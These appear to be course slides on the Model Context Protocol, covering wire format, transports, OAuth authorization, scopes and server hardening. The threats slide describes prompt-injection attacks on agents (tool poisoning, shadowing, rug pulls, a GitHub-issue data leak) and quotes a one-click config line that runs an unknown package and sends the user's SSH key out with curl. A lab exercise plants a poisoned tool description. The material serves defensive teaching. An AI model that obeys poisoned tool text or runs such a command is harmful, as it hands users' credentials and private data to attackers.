MCP, plugins and connectors

The device-driver bus of the AgentOS: what the Model Context Protocol carries, how the stateless 2026-07-28 version works on the wire, how remote servers are authorized, how connectors are distributed, and how MCP servers get attacked and defended.

Who controls each primitive

  • Tools: model-controlled actions (tools/list, tools/call).
  • Resources: application-controlled data by URI (resources/read).
  • Prompts: user-controlled templates, often slash commands (prompts/get).
  • Server → user: elicitation (form or URL). Sampling, roots and logging are deprecated since 2026-07-28.

On the wireOne self-contained tool call over Streamable HTTP

POST /mcp HTTP/1.1
MCP-Protocol-Version: 2026-07-28
Mcp-Method: tools/call
Mcp-Name: search
Authorization: Bearer eyJ...
Content-Type: application/json

{"jsonrpc": "2.0", "id": 7,
 "method": "tools/call",
 "params": {
   "name": "search",
   "arguments": {"q": "kv cache"},
   "_meta": {
     "io.modelcontextprotocol/protocolVersion": "2026-07-28",
     "io.modelcontextprotocol/clientInfo": {...},
     "io.modelcontextprotocol/clientCapabilities": {...}}}}

→ {"result": {"resultType": "complete",
     "content": [...], "isError": false}}

Read it like a sysadmin

  • Mcp-Method and Mcp-Name are required on POST, so gateways and WAFs can route, rate-limit and meter without parsing the body (SEP-2243).
  • A tool can mirror a primitive argument into an Mcp-Param-* header with x-mcp-header; never mark secrets this way.
  • Every result has resultType; results from older servers without it count as "complete".
  • Wrong version → UnsupportedProtocolVersionError.
  • Trace context rides in _meta (traceparent), which ties into the observability deck.
modelcontextprotocol.io/specification/2026-07-28/server/tools; …/basic/transports/streamable-http; changelog minor changes 2 and 4.

Transportsstdio for local drivers, Streamable HTTP for remote ones

stdio

  • The client launches the server as a child process; newline-delimited JSON-RPC on stdin/stdout.
  • stderr is for logs (the replacement for the deprecated Logging feature).
  • No OAuth: credentials come from the environment, so the harness decides which env vars the child sees.
  • Runs with the user's privileges unless the harness sandboxes it.

Streamable HTTP

  • One endpoint; the response is plain JSON or an SSE stream for progress.
  • No resumability since 2026-07-28: a broken stream loses the request, so the client re-issues it with a new id.
  • Validate Origin (DNS rebinding), bind local servers to localhost, authenticate every request.
  • The old HTTP+SSE transport (2024-11-05) is formally Deprecated.

Rule of thumb: stdio when the driver needs the local machine (files, IDE, VPN); HTTP when many users share one service and you want central updates and OAuth.

Asking the userMulti round-trip requests replace server-initiated calls

// 1. client → tools/call {"name": "deploy", ...}
// 2. server answers with an interim result
{"resultType": "input_required",
 "inputRequests": {
   "confirm": {"method": "elicitation/create",
     "params": {"mode": "form",
       "message": "Deploy to prod?",
       "requestedSchema": {...}}}},
 "requestState": "eyJ..."}

// 3. client asks the user, then retries
//    with a NEW JSON-RPC id
{"method": "tools/call",
 "params": {"name": "deploy", ...,
   "inputResponses": {
     "confirm": {"action": "accept",
                 "content": {...}}},
   "requestState": "eyJ..."}}

Design consequences

  • No held-open stream is needed for the server to ask a question; any replica can handle the retry.
  • requestState is opaque server state carried by the client; treat it like a cookie (sign or encrypt it).
  • URL-mode elicitation sends the user to a browser page (OAuth, payments) so secrets never pass through the model.
  • Kernel view: this is a syscall that returns EAGAIN with a continuation, not an upcall into user space.

Context planeResources, prompts and cacheable lists

Resources and prompts

  • Resources are URI-addressed data (file://, git://, custom schemes); the host decides what enters context.
  • Tools can return a resource_link instead of inlining a large blob: a pointer, like an mmap.
  • Prompts are user-picked templates; the host renders them as slash commands.
  • Stateful servers return explicit handles (e.g., basket_id) and check authorization on every call.

Caching (SEP-2549)

  • tools/list, prompts/list, resources/list, resources/read carry ttlMs and cacheScope (public / private).
  • Servers SHOULD return tools in a deterministic order.
  • Why: tool definitions sit at the front of the prompt. A stable, ordered tool list keeps the provider's prompt cache (and your KV cache) warm.
modelcontextprotocol.io/specification/2026-07-28/server/resources, …/server/prompts, …/server/utilities/caching; see the KV-cache deck for prefix caching.

AuthorizationA remote MCP server is an OAuth 2.1 resource server

  1. Client calls without a token → 401 with WWW-Authenticate: Bearer resource_metadata="…", often with a scope.
  2. Client reads Protected Resource Metadata (RFC 9728) to find the authorization server.
  3. Client reads AS metadata (RFC 8414 or OpenID Connect Discovery; clients MUST support both).
  4. Client gets a client ID: Client ID Metadata Document (an HTTPS URL as client_id), pre-registration, or Dynamic Client Registration (now deprecated).
  5. Authorization code + PKCE, with resource=<canonical server URI> (RFC 8707) on both requests.
  6. Client checks iss in the response against the recorded issuer (RFC 9207) before redeeming the code.
  7. Every request carries Authorization: Bearer; the server checks the token's audience is itself.

Rules students get wrong

  • stdio servers SHOULD NOT use this flow; they read credentials from the environment.
  • Tokens never go in the query string.
  • Credentials are bound to the issuer that issued them; re-register when it changes (SEP-2352).
  • Desktop and CLI clients declare application_type so localhost redirects work (SEP-837).
modelcontextprotocol.io/specification/2026-07-28/basic/authorization.

Least privilegeScopes, step-up, and two forbidden patterns

Progressive scopes

  • Start with a minimal scope set; scopes_supported is meant to be the minimum, not the catalog.
  • On a privileged call the server answers 403 error="insufficient_scope", scope="files:write", all needed scopes in one challenge.
  • The client re-authorizes with the union of old and new scopes, retries a few times at most, then gives up.
  • Avoid wildcard scopes (*, full-access).

Never

  • Token passthrough: a server MUST NOT accept tokens not issued for it, nor forward the client's token downstream. It breaks audit, rate limits and audience checks.
  • Confused deputy: a proxy with a static upstream client ID plus DCR plus a consent cookie lets an attacker skip consent. Proxies MUST keep per-client consent, exact redirect_uri match and single-use state.
MCP authorization (scope challenge handling) and Security Best Practices: modelcontextprotocol.io/specification/2025-11-25/basic/security_best_practices.

ThreatsHow MCP servers get attacked

Through the model

  • Tool poisoning (Invariant Labs, Apr 2025): hidden instructions in a tool description made Cursor read ~/.cursor/mcp.json and SSH keys and pass them in a parameter.
  • Shadowing: one server's description rewires a trusted server's tool (all emails go to the attacker).
  • Rug pull: the description changes after the user approved it.
  • Toxic agent flow (May 2025): a public GitHub issue made an agent copy private-repo data into a public PR. No server bug to patch.
  • MCPTox (2508.14925): 45 real servers, 353 tools, 20 agents; up to 72.8% attack success, refusals under 3%. More capable models were often more susceptible.

Around the model

  • Local server compromise: a one-click config that runs npx evil && curl -d @~/.ssh/id_rsa ….
  • SSRF: a malicious server points OAuth metadata at 169.254.169.254 or localhost.
  • Authorization URL injection: javascript: URLs, or URLs opened through a shell.
  • Session hijack (older stateful servers): guessed session IDs inject events.
invariantlabs.ai/blog/mcp-security-notification; invariantlabs.ai/blog/mcp-github-vulnerability; arxiv.org/abs/2508.14925; MCP Security Best Practices.

DefensesA hardening checklist for an MCP-enabled harness

Client / host

  • Show the exact command before adding a local server; run it sandboxed with a filtered env.
  • Allowlist servers and tools (include / enabled_tools); prefix names by server.
  • Pin versions and hash tool descriptions; re-prompt when a description changes.
  • Treat annotations and tool output as untrusted; apply the access control deck's Rule of Two.
  • Block private IP ranges and non-HTTPS URLs during OAuth discovery; open URLs without a shell.

Server

  • Validate audience; never pass tokens through.
  • Minimal scopes with step-up; log elevations.
  • Validate Origin; bind local HTTP to localhost or use stdio.
  • Validate inputs, rate-limit, sanitize outputs; return isError results the model can act on.
  • Opaque, high-entropy handles; authorize on every call.

ExerciseBuild, mount, attack and harden one MCP server

  1. Write a small server with two tools (search_notes, send_note) with an SDK that speaks 2026-07-28; serve it over stdio and Streamable HTTP.
  2. Mount it in two harnesses (Hermes mcp_servers, Codex [mcp_servers]) with a tool filter.
  3. Make send_note ask for confirmation through an input_required result.
  4. Add a poisoned description to a second server and see if the agent leaks a note.
  5. Turn on one defense at a time and measure again.

Report

  • Context tokens spent on tool definitions
  • Requests per call over HTTP (with and without server/discover)
  • Attack success with each defense
  • Which defense lived in the server, the host, or a hook
